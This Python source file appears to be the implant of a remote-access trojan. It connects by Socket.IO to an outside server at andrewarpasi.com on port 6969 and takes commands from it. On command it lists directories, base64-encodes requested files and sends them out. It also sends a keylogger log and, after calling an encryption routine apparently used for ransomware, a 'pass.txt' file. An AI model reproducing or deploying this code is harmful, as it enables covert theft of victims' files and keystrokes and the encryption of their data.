from socketIO_client import SocketIO, BaseNamespace
from sysPathList import *
import base64


class ChatNamespace(BaseNamespace):

    def reply(self, *args):
        print('reply', args)

class NewsNamespace(BaseNamespace):

    def on_aaa_response(self, *args):
        print('on_aaa_response', args)




def reply(*args):
    print('reply', args)

def fileDirReturn(data):

	x = lists(data['dir'])
	if(x == ''):
		x = lists('/')
	if(data['file']!= ''):
		filename = data['file']
		
		file = open(data['dir'] + data['file'], 'rb')
		fileread = file.read()
		encode = base64.encodestring(fileread)
		socketIO.emit("fileData", {'file':filename, 'filedata': encode})
	else:
		socketIO.emit("dirData", {'syslist': x})

def keyLogReturn(data):

		
	file = open("Tracketlog.txt", 'rb')
	fileread = file.read()
	encode = base64.encodestring(fileread)
	socketIO.emit("fileData", {'file':"keyloggerLog.txt", 'filedata': encode})

def encryptStuff(data):
	encryptionExecute()
	file = open("pass.txt", 'rb')
	fileread = file.read()
	encode = base64.encodestring(fileread)
	socketIO.emit("fileData", {'file':"pass.txt", 'filedata': encode})


socketIO = SocketIO('andrewarpasi.com', 6969)

socketIO.emit('registerListener', {'UID': 'testID'}, reply)
socketIO.on("feedback", reply)
socketIO.on('fileReq', fileDirReturn)
socketIO.on('keyLog', keyLogReturn)
socketIO.on('encrypt', encryptStuff)
socketIO.on('fileReq', fileDirReturn)

socketIO.wait_for_callbacks(seconds=20)
